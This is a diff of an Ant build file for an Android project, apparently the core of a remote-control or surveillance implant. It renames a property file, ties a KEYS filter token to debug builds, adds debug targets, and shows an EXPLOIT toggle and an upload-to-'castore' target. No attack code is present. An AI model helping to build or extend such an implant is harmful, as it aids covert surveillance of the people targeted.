@@ -37,7 +37,7 @@
 	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
 	<import file="${sdk.dir}/tools/ant/build.xml" />
 
-	<property file="version" />
+	<property file="version.properties" />
 
 	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />
 
@@ -193,7 +193,7 @@
 					<filter token="EXCEPTION" value="${isdebug}" />
 					<filter token="EXPLOIT" value="${isexploit}" />
 					<filter token="DEMO" value="false" />
-					<filter token="KEYS" value="false" />
+					<filter token="KEYS" value="${isdebug}" />
 					<filter token="FILE" value="true" />
 					<filter token="RANDOM" value="${randomSalt}" />
 					<filter token="OSVERSION" value="@{osversion}" />
@@ -282,6 +282,14 @@
 		<echo>ant set-debug : make messages.bin and cfg.java, for debug</echo>
 		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
 		<echo>ant update : uploads the core to castore</echo>
+	</target>
+	
+	<target name="set-debug-v2" depends="init">
+	    <set-cfg kind="debug" osversion="v2"></set-cfg>
+	</target>
+	
+	<target name="set-debug-default" depends="init">
+	    <set-cfg kind="debug" osversion="default"></set-cfg>
 	</target>
 
 	<target name="build" depends="init">
